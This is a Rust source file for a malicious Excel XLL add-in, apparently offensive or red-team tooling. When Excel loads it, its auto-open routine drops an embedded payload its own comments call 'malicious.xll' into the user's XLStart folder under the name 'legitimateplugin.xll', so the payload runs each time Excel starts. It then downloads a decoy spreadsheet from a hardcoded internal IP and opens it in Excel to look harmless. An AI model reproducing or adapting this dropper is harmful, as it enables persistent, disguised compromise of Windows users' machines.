use std::{ffi::CString, io::Write, {fs::{create_dir, File}, path::Path}};
use windows::{core::PCSTR, Win32::System::Threading::{PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOA}};
use windows::Win32::{Foundation::HMODULE, System::{LibraryLoader::GetModuleFileNameA, Threading::CreateProcessA}};

#[no_mangle]
#[allow(non_snake_case)]
fn xlAutoOpen() -> Result<(), Box<dyn std::error::Error>> {
    // Include the malicious XLL
    let maliciousxll = include_bytes!("malicious.xll");
    // Find username, then add it to a path in order to find the Excel folder in roaming data, then
    // add XLStart if it doesn't exist, and add the malicious XLL file
    let username = std::env::var("USERNAME");
    if username.is_err() {
        panic!();
    };
    let unwrapuser = username.unwrap();
    let mut xlstartpath = "C:\\Users\\".to_owned();
    xlstartpath.push_str(&unwrapuser as &str);
    xlstartpath.push_str("\\AppData\\Roaming\\Microsoft\\Excel\\XLStart");
    if Path::new(&xlstartpath).exists() == false {
        let createdir = create_dir(xlstartpath.clone());
        if createdir.is_err() {
            panic!();
        };
    };
    xlstartpath.push_str("\\legitimateplugin.xll");
    if Path::new(&xlstartpath).exists() == false {
        let mut f = File::create(xlstartpath)?;
        let _ = f.write_all(maliciousxll);
    };

    // Download a legitimate spreadsheet, and save it into the temp directory
    let downloadxls = reqwest::blocking::get("http://192.168.0.100:8081/Temp.xlsx");
    if downloadxls.is_err() {
        panic!()
    };
    let unwrapxls = downloadxls.unwrap();
    let tempdirectory = std::env::var("TEMP");
    if tempdirectory.is_err() {
        panic!();
    };
    let mut tempunwrap = tempdirectory.unwrap();
    tempunwrap.push_str("\\recovery-123.xlsx");
    let mut x = File::create("C:\\Temp\\recovery-123.xlsx")?;
    let _ = x.write_all(&unwrapxls.bytes()?);

    // Create a new process of Excel that opens the downloaded Excel spreadsheet
    unsafe{
        let mut buffer = vec![0 as u8; 200];
        GetModuleFileNameA(
            HMODULE::default(), 
            &mut buffer as &mut [u8]
            );
        loop {
            let positiontodelete = buffer.len();
            if buffer[positiontodelete - 1] == 0 {
                buffer.pop();
            } else {
                break;
            };
        };
        let _ = CreateProcessA(
            PCSTR(
                CString::new(String::from_utf8(buffer)?)?.as_ptr() as *const u8
            ), 
            windows::core::PSTR(CString::new(String::from("/t \"C:\\Temp\\recovery-123.xlsx\""))?.as_ptr() as *mut u8), 
            None, 
            None, 
            false, 
            PROCESS_CREATION_FLAGS(0), 
            None, 
            None, 
            &STARTUPINFOA::default(), 
            &mut PROCESS_INFORMATION::default()
            );
        
    }
    Ok(())
}
